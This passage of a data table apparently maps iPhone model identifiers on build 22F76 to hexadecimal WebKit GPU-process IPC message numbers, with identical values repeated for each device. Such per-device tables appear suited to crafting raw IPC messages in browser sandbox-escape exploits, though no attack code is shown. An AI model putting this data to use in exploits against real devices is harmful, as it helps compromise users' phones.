      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone14,6_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone14,7_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone14,8_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone15,2_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone15,3_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone15,4_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone15,5_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone16,1_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone16,2_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone17,1_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone17,2_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone17,3_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb
   },
   "iPhone17,4_22F76": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
